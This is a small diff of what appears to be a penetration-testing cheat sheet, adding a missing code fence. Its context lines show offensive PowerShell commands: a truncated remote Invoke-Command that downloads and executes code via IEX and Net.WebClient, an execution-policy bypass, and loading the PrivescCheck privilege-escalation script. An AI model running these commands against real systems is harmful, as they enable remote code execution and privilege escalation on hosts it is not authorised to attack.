@@ -4664,6 +4664,7 @@ Invoke-Command -Computer <RHOST> -ScriptBlock { IEX(New-Object Net.WebClient).do
 ```c
 Set-ExecutionPolicy Bypass -Scope Process -Force
 . .\PrivescCheck.ps1
+```
 
 ```c
 Get-Content .\PrivescCheck.ps1 | Out-String | Invoke-Expression
